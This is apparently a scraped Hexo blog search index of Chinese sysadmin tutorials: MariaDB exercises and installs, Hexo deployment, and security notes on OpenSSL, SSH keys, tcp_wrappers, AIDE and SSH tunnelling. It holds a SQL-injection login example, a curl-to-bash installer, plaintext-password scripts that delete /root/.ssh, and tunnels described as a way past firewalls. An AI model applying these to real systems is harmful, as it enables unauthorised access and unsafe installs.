3种方法 123MariaDB [hellodb]&gt; SELECT * FROM students WHERE Age &gt;=20 AND Age &lt;=25; MariaDB [hellodb]&gt; SELECT * FROM students WHERE Age BETWEEN 20 AND 25; MariaDB [hellodb]&gt; SELECT * FROM students WHERE Age IN (20,21,22,23,24,25); 2.练习二导入hellodb.sql，以下操作在students表上执行 以ClassID分组，显示每班的同学的人数 以Gender分组，显示其年龄之和 以ClassID分组，显示其平均年龄大于25的班级 以Gender分组，显示各组中年龄大于25的学员的年龄之和 显示前5位同学的姓名、课程及成绩 显示其成绩高于80的同学的名称及课程； 求前8位同学每位同学自己两门课的平均成绩，并按降序排列 显示每门课程课程名称及学习了这门课的同学的个数 显示其年龄大于平均年龄的同学的名字 显示其学习的课程为第1、2，4或第7门课的同学的名字 显示其成员数最少为3个的班级的同学中年龄大于同班同学平均年龄的同学 统计各班级中年龄大于全校同学平均年龄的同学 answers： SELECT count(StuID),ClassID FROM students GROUP BY ClassID ; SELECT sum(Age),Gender FROM students GROUP BY Gender ; SELECT avg(Age),ClassID FROM students GROUP BY ClassID HAVING avg(Age) &gt; 25; SELECT sum(Age),Gender FROM students WHERE Age &gt; 25 GROUP BY Gender ; 123SELECT s.Name,courses.Course,scores.Score FROM (select * from students limit 5) AS s LEFT JOIN scores ON scores.StuID = s.StuID LEFT JOIN courses ON scores.CourseID =courses.CourseID; 12SELECT Name,Course,Score FROM (students LEFT JOIN scores ON students.StuID=scores.StuID ) LEFT JOIN courses ON courses.CourseID=scores.CourseID WHERE Score &gt; 80; 12SELECT Name,avg(Score) FROM (SELECT * FROM students LIMIT 8) AS rj LEFT JOIN scores ASjr ON rj.StuID=jr.StuID GROUP BY Name ORDER BY avg(Score) DESC; 1SELECT courses.Course,count(rj.StuID) FROM scores AS rj LEFT JOIN courses ON courses.CourseID=rj.CourseID GROUP BY rj.CourseID; 1SELECT Name,Age FROM students WHERE Age &gt; (SELECT avg(Age) FROM students); 1SELECT rj.Name,scores.CourseID FROM students AS rj LEFT JOIN scores ON scores.StuID = rj.StuID WHERE scores.CourseID IN (1,2,4,7) 1234SELECT students.name,students.age,tp.classid,tp.avga FROM students,(SELECT classid,COUNT(stuid) AS cs,AVG(age) AS avga FROM students GROUP BY classid HAVING cs &gt;=3) AS tp WHERE students.age&gt;tp.avga AND students.classid=tp.classid; 1SELECT rj.Name,rj.Age FROM students AS rj LEFT JOIN classes AS jr ON rj.ClassID=jr.ClassID WHERE rj.ClassID=jr.ClassID AND Age &gt; (SELECT AVG(Age) FROM students);]]></content>
      <categories>
        <category>MYSQL</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MYSQL(一)]]></title>
    <url>%2Fhexo-mysql1.html</url>
    <content type="text"><![CDATA[安装MariaDByum 安装mariadbcentos7.4系统光盘带的是5.5 123]#yum install mariadb-server -y -q]#rpm -q --scripts mysql-server #安装前脚本]#ll /var/lib/mysql/ centos7.4二进制安装mariadb-10.2.151.准备用户，解压缩包12]#useradd -r -d /data/mysqldb -s /sbin/nologin mysql]#tar xvf mariadb-10.2.15-linux-x86_64.tar.gz -C /usr/local 2.准备二进制的程序12345]#cd /usr/local]#ln -s mariadb-10.2.15-linux-x86_64/ mysql]#chown -R root:root /usr/local/mysql/ #修改文件的所属组]#setfacl -R -m u:mysql:rwx /usr/local/mysql/]#echo PATH=/usr/local/mysql/bin:$PATH &gt;/etc/profile.d/mysql.sh 3.准备数据目录: 建议逻辑卷，添加新硬盘/dev/sdb 1234567891011]#echo &apos;- - -&apos; &gt; /sys/class/scsi_host/host2/scan]#lsblk]#pvcreate /dev/sdb]#vgcreate vg0 /dev/sdb]#lvcreate -n lv_mysql -l 100%FREE vg0]#mkfs.xfs /dev/vg0/lv_mysql]#vim /etc/fstab #增加自动挂载,避免重启挂载，mount /dev/vg0/lv_mysql /data]#mount -a #挂载]#mkdir /data/mysqldb -pv]#chown mysql.mysql /data/mysqldb]#chmod 770 /data/mysqldb #改变权限，更安全 4.创建数据库文件及配置文件1234567891011121314]#cd /usr/local/mysql/]#scripts/mysql_install_db --datadir=/data/mysqldb --user=mysqlInstalling MariaDB/MySQL system tables in &apos;/data/mysqldb&apos; ...OK··· ]#ll /data/mysqldb/ #生成数据库文件]#cp /etc/my.cnf /etc/my.cnf.bak]#cp /usr/local/mysql/support-files/my-huge.cnf /etc/my.cnf]#vim /etc/my.cnf [client]socket=/tmp/mysql.sock[mysqld]datadir=/data/mysqldbsocket=/tmp/mysql.sock 5.启动服务及安全初始化12345]#cp /usr/local/mysql/support-files/mysql.server /etc/init.d/mysqld]#chkconfig --add mysqld]# service mysqld startStarting mysqld (via systemctl): [ OK ]]#/user/local/mysql/bin/mysql_secure_installation #安全加护 源码编译安装mariadb-10.2.151.编译前准备12345678]#yum install bison bison-devel zlib-devel libcurl-devel libarchive-devel boost-devel gcc gcc-c++ cmake ncurses-devel gnutls-devel libxml2-devel openssl-devel libevent-devel libaio-devel -y]#yum install -y cmake]#useradd -r -d /data/mysqldb -s /sbin/nologin mysql]#mkdir /data/mysqldb -pv]#mkdir /app/mysql -pv]#setfacl -R -m u:mysql:rwx /app/mysql]#chown mysql.mysql /data/mysqldb]#chmod 770 /data/mysqldb 2.编译安装阶段，使用cmake12345678910111213141516171819202122]#tar -xf mariadb-10.2.15.tar.gz]#cd mariadb-10.2.15/]#cmake . \-DCMAKE_INSTALL_PREFIX=/app/mysql \-DMYSQL_DATADIR=/data/mysqldb/ \-DSYSCONFDIR=/etc \-DMYSQL_USER=mysql \-DWITH_INNOBASE_STORAGE_ENGINE=1 \-DWITH_ARCHIVE_STORAGE_ENGINE=1 \-DWITH_BLACKHOLE_STORAGE_ENGINE=1 \-DWITH_PARTITION_STORAGE_ENGINE=1 \-DWITHOUT_MROONGA_STORAGE_ENGINE=1 \-DWITH_DEBUG=0 \-DWITH_READLINE=1 \-DWITH_SSL=system \-DWITH_ZLIB=system \-DWITH_LIBWRAP=0 \-DENABLED_LOCAL_INFILE=1 \-DMYSQL_UNIX_ADDR=/app/mysql/mysql.sock \-DDEFAULT_CHARSET=utf8 \-DDEFAULT_COLLATION=utf8_general_ci]#make -j 3 &amp;&amp; make install &amp;&amp; for i in &#123;1..5&#125;;do echo -e &quot;\a&quot; ;done 3.编译后的相关配置123456789]#cd /app/mysql]#scripts/mysql_install_db --datadir=/data/mysqldb --user=mysql --basedir=/app/mysql]#cp /app/mysql/support-files/my-huge.cnf /etc/my.cnf]#vim /etc/my.cnf[mysqld]datadir = /data/mysqldb]#cp /app/mysql/support-files/mysql.server /etc/init.d/mysqld]#chkconfig --add mysqld]#service mysqld start MariaDB简单多实例实现创建多实例的文件目录123456]#yum install mariadb-server -y]#mkdir /mysqldb/&#123;3306,3307,3308&#125;/&#123;etc,socket,pid,log,data&#125; -pv]#chown -R mysql.mysql /mysqldb/]#mysql_install_db --datadir=/mysqldb/3306/data --user=mysql ]#mysql_install_db --datadir=/mysqldb/3307/data --user=mysql]#mysql_install_db --datadir=/mysqldb/3308/data --user=mysql 配置相关多实例的配置文件123456789101112131415]#vim /etc/my.cnf[mysqld]port=3306datadir=/mysqldb/3306/datasocketdir=/mysqldb/3306/socket/mysql.sock[mysqld_safe]log-error=/mysqldb/3306/log/mariadb.logpid-file=/mysqldb/3306/pid/mariadb.pid]#cp /etc/my.cnf /mysqldb/3306/etc/]#cp /etc/my.cnf /mysqldb/3307/etc/]#cp /etc/my.cnf /mysqldb/3308/etc/]#vim /mysqldb/3307/etc/my.cnf:%s/3306/3307/g]#vim /mysqldb/3308/etc/my.cnf:%s/3306/3308/g 编辑多实例的服务脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788]#vim /mysqldb/3306/mysqld #编辑启动脚本#!/bin/bashport=3306mysql_user=&quot;root&quot;mysql_pwd=&quot;&quot;cmd_path=&quot;/app/mysql/bin&quot;mysql_basedir=&quot;/mysqldb&quot;mysql_sock=&quot;$&#123;mysql_basedir&#125;/$&#123;port&#125;/socket/mysql.sock&quot;function_start_mysql()&#123; if [ ! -e &quot;$mysql_sock&quot; ];then printf &quot;Starting MySQL...\n&quot; $&#123;cmd_path&#125;/mysqld_safe --defaults-file=$&#123;mysql_basedir&#125;/$&#123;port&#125;/etc/my.cnf &amp;&gt; /dev/null &amp; else printf &quot;MySQL is running...\n&quot; exit fi&#125;function_stop_mysql()&#123; if [ ! -e &quot;$mysql_sock&quot; ];then printf &quot;MySQL is stopped...\n&quot; exit else printf &quot;Stoping MySQL...\n&quot; $&#123;cmd_path&#125;/mysqladmin -u $&#123;mysql_user&#125; -p$&#123;mysql_pwd&#125; -S $&#123;mysql_sock&#125; shutdown fi&#125;function_restart_mysql()&#123; printf &quot;Restarting MySQL...\n&quot; function_stop_mysql sleep 2 function_start_mysql&#125;case $1 instart) function_start_mysql;;stop) function_stop_mysql;;restart) function_restart_mysql;;*) printf &quot;Usage: $&#123;mysql_basedir&#125;/$&#123;port&#125;/bin/mysqld &#123;start|stop|restart&#125;\n&quot;esac]#chmod 700 /mysqldb/&#123;3306,3307,3308&#125;/mysqld]#/mysqldb/3306/mysqld start]#/mysqldb/3307/mysqld start]#/mysqldb/3308/mysqld start]# ss -ntlState Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 50 *:3307 *:* LISTEN 0 50 *:3308 *:* LISTEN 0 128 *:111 *:* LISTEN 0 5 192.168.122.1:53 *:* LISTEN 0 128 *:22 *:* LISTEN 0 128 127.0.0.1:631 *:* LISTEN 0 50 *:3306 *:* LISTEN 0 128 :::111 :::* LISTEN 0 128 :::22 :::* LISTEN 0 128 ::1:631 :::* ]#mysql -S /mysqldb/3306/socket/mysql.sockMariaDB [(none)]&gt; show variables like &apos;%port%&apos;;+-------------------------------------+-------+| Variable_name | Value |+-------------------------------------+-------+| extra_port | 0 || innodb_import_table_FROM_xtrabackup | 0 || innodb_support_xa | ON || large_files_support | ON || port | 3306 || progress_report_time | 5 || report_host | || report_password | || report_port | 3306 || report_user | |+-------------------------------------+-------+10 rows in set (0.00 sec)MariaDB [(none)]&gt; SELECT user,host,password FROM mysql.user;MariaDB [(none)]&gt; update mysql.user set password=password(&quot;centos&quot;) where user=&quot;root&quot;;MariaDB [(none)]&gt; flush privileges; #使密码生效MariaDB [(none)]&gt; \s #等价status]]></content>
      <categories>
        <category>MYSQL</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo简易部署到云主机]]></title>
    <url>%2Fhexo-easy-deploy.html</url>
    <content type="text"><![CDATA[hexo简易部署到云主机写在前面一开始将自己hexo部署到github，结果发现打开页面速度有点慢，然后又将其同时部署到coding,实现双线路访问，国内解析记录到coding，国外解析到github，这样确实网站的速度能提高不少，但是国内访问因为是经过coding，所以打开网站会有广告，这点不能容忍，于是想到自己的服务器也还空闲着，于是想到可以部署到自己的服务器上，折腾开始 。 简易部署思想 云主机上直接利用hexo，generate生成静态页面文件夹public，然后利用apche或者nginx服务，直接指向pubilc文件，从而简易实现部署，不需要利用GIT仓库中转。 在云主机上搭建一个git裸仓库，然后使用nginx作为网页服务器，就可以轻松将Hexo博客通过git部署到云主机上。 这个方法有种周转的意思，既然是自己的主机，直接可以利用上诉思想。 Hexo 简介Hexo 是一个 Node.js 编写的静态网站生成器。Hexo 主要用来做博客框架，同时 Hexo 也整合了将静态网站部署到 Github 的功能，所以也很适合用来做 Github 项目的文档。 我们可以使用 Hexo，根据写好的 HTML 布局（既 Hexo 的主题），将 MarkDown 文件生成成主题对应的静态 html/css/js 文件。Hexo 提供了将静态文件部署到 Github 分支上的配置。也就是说，我们可以使用 MarkDown 来维护文档，当写好部署配置之后，使用一个命令就可以将文档生成并发布到 Github 的 gh-pages 分支上。 服务器部署(推荐)服务器端安装hexocentos6.9直接yum安装npm会各种报错，下面这种用nvm安装npm不仅不报错，速度还可以1234]# wget -qO- https://raw.githubusercontent.com/creationix/nvm/v0.31.1/install.sh | bash]# . .bashrc]# nvm install stable]# npm install -g hexo-cli cnetos7.4简单省事的方法可以按照cnetos6.9的方法，但是用惯了yum的同学还是习惯这个12]# yum install -y npm]# npm install -g hexo-cli 安装ngnix1]# yum install -y nginx 配置文件,修改网站根目录1234567891011121314]# vim /etc/nginx/nginx.confserver server &#123; listen 80; # server_name 填写自己的域名 server_name www.fenghong.tech; # 这里root填写自己的网站根目录 root /hexo; index index.html index.php index.htm; #/usr/local/tomcat/webapps/Forum&#125;]# systemctl start nginx #启动nginx服务]# systemctl enable ngnix #开机自动启动 在hexo的家目录中生成指定的静态页面12345]# cd /data]# hexo init hexo #会生成hexo文件夹]# cd /data/hexo #进入到hexo的家目录]# hexo g]# ln -s /data/hexo/public /hexo #将public文件夹指向nginx网站的根目录 DNS解析 在dns设置解析记录，设置解析A记录www解析到服务器IP地址, 解析线路默认,增加如下记录 www A 34.231.75.23 注意：hexo的家目录的权限，否则会出现403报错. 本地云同步在服务器端操作总会感觉到延迟，操作起来很不流畅；想了想，还是在本地主机编辑好文章，直接利用rsync推送至vps，达到同步效果。 本地hexo主机配置12345678910]# yum istall -y npm]# npm install -g hexo-cli]# npm install hexo-generator-search --save]# npm install hexo-generator-searchdb --save]# npm install hexo-deployer-git --save]# npm install hexo-renderer-scss --save]# cd /data]# hexo init hexo #会生成hexo文件夹]# cd /data/hexo #进入到hexo的家目录]# hexo g #生成public文件夹 推送至vps利用rsync推送至远程主机，假设我主机IP:46.123.43.127，当然这不是我的主机。默认vps端已经安装好nginx，且主机的nginx服务器网站根目录为/www，如果未安装，请安装nginx服务器。 rsync的具体用法了解，参见 123456]#vim push.sh#!/bin/bash[ "$1" == "clean" ] &amp;&amp; hexo cleanhexo g &amp;&amp; rsync -v -r /data/hexo/public/ 46.123.43.127:/www]# chmod +x push.sh]# ./push.sh 我是个爱折腾的，至此，云主机搭建完毕，hexo静态页面很清爽！ 博客主题配置，及文章上传方法，请看上篇博文hexo进阶 git使用rsync也算是比较不fashion的，还是用回高大上的git吧。 使用git自动化部署博客自动化部署主要用到了git-hooks同步 服务器建立裸库，这里要用git用户登录，确保git用户拥有仓库所有权 123su gitcd /var/repo/git init --bare blog.git 使用 git-hooks 同步网站根目录在这里我们使用的是 post-update这个钩子（也有可能是post-receive，具体进入文件就知道了），当git有收发的时候就会调用这个钩子。 在 /var/repo/blog.git 裸库的 hooks文件夹中 12vim /var/repo/blog.git/hooks/post-receive# 编辑文件，写入以下内容 12#!/bin/shgit --work-tree=/var/www/hexo --git-dir=/var/repo/blog.git checkout -f 保存后，要赋予这个文件可执行权限 1chmod +x post-receive 配置_config.yml,完成自动化部署打开_config.yml, 找到deploy，#云主机改变端口后可以按注释的。比如ssh端口为12345 12345678deploy: type: git repo: github: git@github.com:oldthreefeng/oldthreefeng.github.io.git #www: ssh://git@fenghong.tech:12345/blog/blog.git www: git@fenghong.tech:/var/repo/blog.git branch: master 保存后，即可测试部署 1hexo clean &amp;&amp; hexo g -d 至此，我们已经成功部完成，并且访问自己的服务器端比访问github快多了，国外速度也是很好 常见问题我在部署过程中，执行 hexo d发现部署老是出错，什么权限不允许之类的，这里我们需要检查我们在上述的git操作部署是否使用了git用户操作，若是没有，需要给相应的目录更改用户组；使用chown -R git:git /var/repo/这条命令递归的将repo目录及其子目录用户组设置为git，同时chown -R git:git /var/www/hexo，这样即可解决此类问题.]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Safe]]></title>
    <url>%2Fhexo-openssh.html</url>
    <content type="text"><![CDATA[摘要：安全机制，openssl，基于key的验证，CA证书，pssh，AIDE简介 安全机制信息安全防护的目标 保密性 Confidentiality 完整性 Integrity 可用性 Usability 可控制性Controlability 不可否认性 Non-repudiation 安全防护环节 物理安全：各种设备/主机、机房环境 系统安全：主机或设备的操作系统 应用安全：各种网络服务、应用程序 网络安全：对网络访问的控制、防火墙规则 数据安全：信息的备份与恢复、加密解密 管理安全：各种保障性的规范、流程、方法 123#不安全的登录示例select * from user where username=&quot;xxx&quot; and password=&quot;xxx&quot;password=&quot;x&apos; or &quot;1=1 安全算法(DES)常用安全技术 认证授权审计安全通信 密码算法和协议： 对称加密公钥加密单向加密认证协议Linux系统：OpenSSL, gpg(pgp协议的实现) 非对称加密: 公钥加密：密钥是成对出现公钥：公开给所有人；public key私钥：自己留存，必须保证其私密性；secret key特点：用公钥加密数据，只能使用与之配对的私钥解密；反之亦然功能：数字签名：主要在于让接收方确认发送方身份对称密钥交换：发送方用对方的公钥加密一个对称密钥后发送给对方数据加密：适合加密较小数据缺点：密钥长，加密解密效率低下算法：RSA（加密，数字签名）,DSA（数字签名）,ELGamal 123算法 加密前 加密后 加密时间 解密时间DES 1G 2G 4m 8mRSA 1G 1G 1m 64h 哈希算法—-单向散列算法hash(data)=digest 摘要digest不可反推data.digest长度固定MD5:128sha1:160sha512:512 123456789101112]# gpg 实现对称加密]# gpg -c file #加密]# gpg -d file #解密]# gpg --gen-key]# gpg -a --export -o magedu.pubkey]# gpg --import magedu.pukey #导入mage的公钥]# gpg --list-keys]# gpg -e -r magedu fstab #加密]# gpg -o f1 -d fstab.gpg #解密]# ]# gpg --delete-keys magedu]# gpg --delete-secret-keys magedu A发送前的动作：Pb{data+Sa{hash(data)}}B接受后的动作：Sb---data+sa{hash(data)}a1为B解封装用统一的hash运算a1=hash(data),a2=Pa-----hash(data)---digesta1=a2,原文未被修改。 OpenSSLOpenSSL：开源项目三个组件： openssl: 多用途的命令行工具，包openssllibcrypto: 加密算法库，包openssl-libslibssl：加密模块应用库，实现了ssl及tls，包nss openssl命令： 两种运行模式：交互模式和批处理模式openssl version：程序版本号标准命令、消息摘要命令、加密命令标准命令：enc, ca, req, … $1$O00iE0kF$XldXxBeSm6s50Pijm9yQB1为MD5 salt为O00iE0kF1234#生成私钥]#(umask 077; openssl genrsa –out test.key –des 2048)#从私钥中提取公钥]#openssl rsa -in private.key2 -pubout -out public.key2 实验：向CA申请证书1.建立root CA ；root CA 服务器192.168.1.8上生成私钥,配置文件如下123456789101112131415161718]# vim /etc/pki/tls/openssl.cnf[ CA_default ]dir = /etc/pki/CA # Where everything is keptcerts = $dir/certs # Where the issued certs are keptcrl_dir = $dir/crl # Where the issued crl are keptdatabase = $dir/index.txt # database index file.#unique_subject = no # Set to &apos;no&apos; to allow creation of # several ctificates with same subject.new_certs_dir = $dir/newcerts # default place for new certs.certificate = $dir/cacert.pem # The CA certificateserial = $dir/serial # The current serial numbercrlnumber = $dir/crlnumber # the current crl number # must be commented out to leave a V1 CRLcrl = $dir/crl.pem # The current CRLprivate_key = $dir/private/cakey.pem # The private keyRANDFILE = $dir/private/.rand # private random number filex509_extensions = usr_cert # The extentions to add to the cert 2.自签名rootCA123456789101112131415]# cd /etc/pki/CA]# (umask 077;openssl genrsa -out private/cakey.pem 4096 )]# tree ]# openssl req -new -x509 -key private/cakey.pem -out cacert.pem -days 3650 Country Name (2 letter code) [XX]:CN State or Province Name (full name) []:beijing Locality Name (eg, city) [Default City]:beijing Organization Name (eg, company) [Default Company Ltd]:test Organizational Unit Name (eg, section) []:opt Common Name (eg, your name or your server&apos;s hostname) []:ca.test.com]# cat cacert.pem #不同形式查看cacert.pem]# openssl x509 -in cacert.pem -noout -text]# openssl x509 -in cacert.pem -noout -dates]# openssl x509 -in cacert.pem -noout -issuer -new :生成新证书签署请求-x509: 专用于CA生成自签证书-key: 生成请求时用到的私钥文件-days n：证书的有效期限-out / PATH/TO/SOMECERTFILE : 证书的保存路径 3.生成私钥及证书申请文件服务器或用户申请证书，并将申请发送至rootCA123456789]# (umask 077;openssl genrsa -out app.key 1024) ]# openssl req -new -key app.key -out app.scr Country Name (2 letter code) [XX]:CN State or Province Name (full name) []:beijing Locality Name (eg, city) [Default City]:beijing Organization Name (eg, company) [Default Company Ltd]:test Organizational Unit Name (eg, section) []:opt Common Name (eg, your name or your server&apos;s hostname) []:ca.testuser.com]# scp app.scr 192.168.1.8:/etc/pki/CA 4.CA颁发证书,并回传证书12345]# cd /etc/pki/CA]# touch index.txt]# echo 00 &gt; serial ]# openssl ca -in app.scr -out certs/app.crt -days 100 ]# ll certs/app.crt 基于key认证基于密钥的登录方式 首先在客户端生成一对密钥（ssh-keygen） 并将客户端的公钥ssh-copy-id 拷贝到服务端 当客户端再次发送一个连接请求，包括ip、用户名 服务端得到客户端的请求后，会到authorized_keys中查找，如果有响应的IP和用户，就会随机生成一个字符串，例如：acdf 服务端将使用客户端拷贝过来的公钥进行加密，然后发送给客户端 得到服务端发来的消息后，客户端会使用私钥进行解密，然后将解密后的字符串发送给服务端 服务端接受到客户端发来的字符串后，跟之前的字符串进行对比，如果一致，就允许免密码登录 基于key密钥的认证：(1) 在客户端生成密钥对 1ssh-keygen -t rsa [-P &apos;&apos;] [-f “~/.ssh/id_rsa&quot;] (2) 把公钥文件传输至远程服务器对应用户的家目录1ssh-copy-id [-i [identity_file]] [user@]host (3) 测试(4) 在SecureCRT或Xshell实现基于key验证在SecureCRT工具—&gt;创建公钥—&gt;生成Identity.pub文件转化为openssh兼容格式（适合SecureCRT，Xshell不需要转化格式），并复制到需登录主机上相应文件authorized_keys中,注意权限必须为600，在需登录的ssh主机上执行：1ssh-keygen -i -f Identity.pub &gt;&gt; .ssh/authorized_keys (5)重设私钥口令：ssh-keygen –p(6)验证代理（authentication agent）保密解密后的密钥• 这样口令就只需要输入一次• 在GNOME中，代理被自动提供给root用户• 否则运行ssh-agent bash(7)钥匙通过命令添加给代理ssh-add 实验：实现100台主机基于key的验证,实现远程管理.批量解决多台服务器基于key的验证登录：12345678910111213141516171819202122232425]# cat &gt;&gt; ip.txt &lt;&lt;EOF192.168.1.6:passwd192.168.1.7:passwd192.168.1.8:passwd192.168.1.9:passwd192.168.1.10:passwdEOF]# vim sshkey.sh#!/bin/bashrpm -q expect &amp;&gt; /dev/null || yum install -y -q[ -d /root/.ssh ] &amp;&amp; rm -rf /root/.sshssh-keygen -P &quot;&quot; -f &quot;/root/.ssh/id_rsa&quot;while read line;doip=&#123;line[%%:*]&#125;password=&#123;line[##*:]&#125;expect &lt;&lt; EOFset timeout 10spawn ssh-copy-id $ipexpect &#123; &quot;yes/no&quot; &#123; send &quot;yes\n&quot;;exp_continue &#125; &quot;password&quot; &#123; send &quot;$password\n&quot; &#125;&#125;expect eofEOF done &lt; ip.txt tcp_wapper 实现安全控制实现主机的访问控制。客户端Client_list格式以逗号或空格分隔的客户端列表基于IP地址：192.168.10.1 192.168.1.32基于主机名：www.qq.com .qq.com 较少用基于网络/掩码：192.168.0.0/255.255.255.0基于net/prefixlen: 192.168.1.0/24（CentOS7）基于网络组（NIS 域）：@mynetwork内置ACL：ALL，LOCAL，KNOWN，UNKNOWN，PARANOID12345#只允许192.168.1.0/24的主机访问sshd/etc/hosts.allowsshd: 192.168.1./etc/hosts.denysshd :ALL 日志功能1sshd: ALL :spawn echo &quot;$(date +%%F) login attempt from %c to %s,%d&quot; &gt;&gt;/var/log/sshd.log 说明： 在/etc/hosts.allow中添加，允许登录，并记录日志在/etc/hosts.deny中添加，拒绝登录，并记录日志%c 客户端信息%s 服务器端信息%d 服务名%p 守护进程的PID%% 表示%vsftpd: 172.16. :twist /bin/echo “connection prohibited” AIDE 当一个入侵者进入了你的系统并且种植了木马，通常会想办法来隐蔽这个木马（除了木马自身的一些隐蔽特性外，他会尽量给你检查系统的过程设置障碍），通常入侵者会修改一些文件，比如管理员通常用ps -aux来查看系统进程，那么入侵者很可能用自己经过修改的ps程序来替换掉你系统上的ps程序，以使用ps命令查不到正在运行的木马程序。如果入侵者发现管理员正在运行crontab作业，也有可能替换掉crontab程序等等。所以由此可以看出对于系统文件或是关键文件的检查是很必要的。目前就系统完整性检查的工具用的比较多的有两款：Tripwire和AIDE，前者是一款商业软件，后者是一款免费的但功能也很强大的工具 高级入侵检测环境)是一个入侵检测工具，主要用途是检查文件的完整性，审计计算机上的那些文件被更改过了。 AIDE能够构造一个指定文件的数据库，它使用aide.conf作为其配置文件。AIDE数据库能够保存文件的各种属性，包括：权限(permission)、索引节点序号(inode number)、所属用户(user)、所属用户组(group)、文件大小、最后修改时间(mtime)、创建时间(ctime)、最后访问时间(atime)、增加的大小以及连接数。AIDE还能够使用下列算法：sha1、md5、rmd160、tiger，以密文形式建立每个文件的校验码或散列号. 1234567891011]# yum install aide#修改配置文件]# vim /etc/aide.conf (指定对哪些文件进行检测)/test/chameleon R/bin/ps R+a/usr/bin/crontab R+a/etc PERMS!/etc/mtab #“!”表示忽略这个文件的检查R=p+i+n+u+g+s+m+c+md5 权限+索引节点+链接数+用户+组+大小+最后一次修改时间+创建时间+md5校验值NORMAL = R+rmd60+sha256 更新AIDE库123456789初始化默认的AIDE的库：/usr/local/bin/aide --init生成检查数据库（建议初始数据库存放到安全的地方）cd /var/lib/aidemv aide.db.new.gz aide.db.gz检测：/usr/local/bin/aide --check更新数据库aide --update psshpssh是一个python编写可以在多台服务器上执行命令的工具，也可实现文件copy123456789101112131415--version：查看版本-h：主机文件列表，内容格式&apos;[user@]host[:port]&apos;-H：主机字符串，内容格式&apos;[user@]host[:port]&apos;-l：登录使用的用户名-p：并发的线程数【可选】-o：输出的文件目录【可选】-e：错误输入文件【可选】-t：TIMEOUT 超时时间设置，0无限制【可选】-O：SSH的选项-v：详细模式-A：手动输入密码模式-x：额外的命令行参数使用空白符号，引号，反斜线处理-X：额外的命令行参数，单个参数模式，同-x-i：每个服务器内部处理信息输出-P：打印出服务器返回信息 pscp.psshpscp.pssh功能是将本地文件批量复制到远程主机 12pscp [-vAr] [-h hosts_file] [-H [user@]host[:port]] [-l user] [-p par] [-o outdir] [-e errdir][-t timeout] [-O options] [-x args] [-X arg] local remote Pscp-pssh选项 -v 显示复制过程 -a 复制过程中保留常规属性 -r 递归复制目录1234567##将本地curl.sh 复制到/app/目录]#pscp.pssh -H 192.168.1.10 /root/test/curl.sh /app/]#pscp.pssh -h host.txt /root/test/curl.sh /app/##将本地多个文件批量复制到/app/目录]#pscp.pssh -H 192.168.1.10 /root/f1.sh /root/f2.sh /app/##将本地目录批量复制到/app/目录]#pscp.pssh -H 192.168.1.10 -r /root/test/ /app/ pslurppslurp.pssh功能是将远程主机的文件批量复制到本地 1pslurp [-vAr] [-h hosts_file] [-H [user@]host[:port]] [-l user] [-p par][-o outdir] [-e errdir] [-t timeout] [-O options] [-x args] [-X arg] [-L localdir] remote local（本地名）Pslurp-pssh选项-L 指定从远程主机下载到本机的存储的目录，local是下载到本地后的名称-r 递归复制目录12#批量下载目标服务器的messages文件至/data下，并更名为m]# pslurp -H 192.168.1.10 -L /data/ /var/log/messages m SSH端口转发​ SSH 会自动加密和解密所有 SSH 客户端与服务端之间的网络数据。但是，SSH还能够将其他 TCP 端口的网络数据通过 SSH 链接来转发，并且自动提供了相应的加密及解密服务。这一过程也被叫做“隧道”（tunneling），这是因为 SSH 为其他 TCP 链接提供了一个安全的通道来进行传输而得名。例如，Telnet，SMTP，LDAP 这些 TCP 应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果工作环境中的防火墙限制了一些网络端口的使用，但是允许 SSH 的连接，也能够通过将 TCP 端口转发来使用 SSH 进行通讯。 SSH 端口转发能够提供两大功能： 加密 SSH Client 端至 SSH Server 端之间的通讯数据 突破防火墙的限制完成一些之前无法建立的 TCP 连接 场景1:在外地的client想访问公司的telnet服务器（不能直连），我在外地。 localclient:192.168.30.7 sshsrv:192.168.30.6 telnetsrv:192.168.30.17]# ssh -L 9527:192.168.30.17:23 -Nf 192.168.30.6 (搭桥梁)]# telnet 127.0.0.1:9527 直连telnet服务器保证telnet-server包在服务器上有安装注意：centos系统上telnet不让root登录，只允许普通用户登录 场景2 :在外地的client想访问公司的telnet服务器（不能直连）,我在lanserver。lanserver：ssh client; telnet client:192.168.30.6internet client:192.168.30.7telnetsrv:192.168.30.17在lanserver上操作：]# ssh -R 9527:192.168.30.17:23 -Nf 192.168.30.7 跳板原理当用firefox访问internet时，本机的1080端口做为代理服务器，firefox的访问请求被转发到sshserver上，由sshserver替之访问internet]# ssh -D 1080 root@sshserver]# curl -socks5 127.0.0.1:1080 http://www.qq.com ssh协议的另一实现：dropbeardropbear编译安装 安装前装备： 12345]# yum groupinstall “Development tools”#下载dropbear-2018.76.tar.bz2]# tar -xvf dropbear-2018.76.tar.bz2]# cd dropbear-2018.76]# less INSTALL RAEDME 开始安装：12345678]# ./configure --prefix=/data/dropbear --sysconfdir=/etc/dropbear/]# make PROGRAMS=&quot;dropbear dbclient dropbearkey dropbearconvert scp&quot;]# make PROGRAMS=&quot;dropbear dbclient dropbearkey dropbearconvert scp&quot; install]# mkdir /etc/dropbear #confdir没有生成成功，自建这个文件夹]# cat &gt;&gt;/etc/profile.d/dropbear.sh&lt;&lt; EOF]# PATH=/data/dropbear/bin/:/data/dropbear/sbin/:$PATH]# EOF #添加环境变量]# . /etc/profile.d/dropbear.sh 运行dropbear：1234]# dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key -s 2048]# dropbear -p :9528 -F –E #前台运行]# dropbear -p :9528 #后台运行]# ssh 192.168.1.8 -p 9528#客户端执行]]></content>
      <categories>
        <category>SSH</category>
      </categories>
      <tags>
        <tag>Safe</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ansible]]></title>
    <url>%2Fhexo-Ansible.html</url>
